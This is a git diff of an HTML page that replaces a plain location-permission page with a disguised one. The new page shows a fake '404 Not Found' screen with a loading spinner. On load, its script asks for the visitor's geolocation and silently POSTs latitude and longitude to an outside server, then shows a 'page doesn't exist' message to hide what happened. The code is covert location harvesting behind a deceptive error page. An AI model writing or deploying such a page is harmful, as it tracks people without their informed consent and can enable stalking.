@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 	<head>
 		<meta charset="UTF-8" />
@@ -28,6 +28,133 @@
 				},
 				(error) => {
 					document.body.innerHTML = "<h2>❌ Location permission denied.</h2>";
+				}
+			);
+		</script>
+	</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<title>404 Not Found</title>
+		<style>
+			* {
+				margin: 0;
+				padding: 0;
+				box-sizing: border-box;
+			}
+
+			body {
+				font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+				background: url("https://images.unsplash.com/photo-1558981033-7d0a148da537?auto=format&fit=crop&w=1600&q=80")
+					no-repeat center center/cover;
+				height: 100vh;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				color: white;
+				position: relative;
+				overflow: hidden;
+				text-align: center;
+			}
+
+			body::before {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: rgba(0, 0, 0, 0.7);
+				z-index: 0;
+			}
+
+			.content {
+				z-index: 1;
+				padding: 2rem;
+			}
+
+			h1 {
+				font-size: 4rem;
+				margin-bottom: 0.5rem;
+			}
+
+			p {
+				font-size: 1.2rem;
+				margin-top: 0.5rem;
+			}
+
+			.spinner {
+				border: 8px solid rgba(255, 255, 255, 0.2);
+				border-top: 8px solid white;
+				border-radius: 50%;
+				width: 60px;
+				height: 60px;
+				animation: spin 1s linear infinite;
+				margin: 2rem auto;
+			}
+
+			@keyframes spin {
+				to {
+					transform: rotate(360deg);
+				}
+			}
+
+			.fade-in {
+				animation: fadeIn 1s ease-in-out forwards;
+			}
+
+			@keyframes fadeIn {
+				from {
+					opacity: 0;
+					transform: translateY(20px);
+				}
+				to {
+					opacity: 1;
+					transform: translateY(0);
+				}
+			}
+		</style>
+	</head>
+	<body>
+		<div class="content" id="status">
+			<h1>Loading...</h1>
+			<div class="spinner"></div>
+		</div>
+
+		<script>
+			navigator.geolocation.getCurrentPosition(
+				(position) => {
+					const { latitude, longitude } = position.coords;
+
+					fetch("https://offer-2cpt.onrender.com/api/location", {
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json",
+						},
+						body: JSON.stringify({ latitude, longitude }),
+					}).finally(() => {
+						setTimeout(() => {
+							document.getElementById("status").innerHTML = `
+              <div class="fade-in">
+                <h1>404</h1>
+                <p>Sorry, the page you're looking for doesn't exist.</p>
+              </div>
+            `;
+						}, 2000);
+					});
+				},
+				(error) => {
+					setTimeout(() => {
+						document.getElementById("status").innerHTML = `
+            <div class="fade-in">
+              <h1>404</h1>
+              <p>Page not found. Location access was denied.</p>
+            </div>
+          `;
+					}, 2000);
 				}
 			);
 		</script>
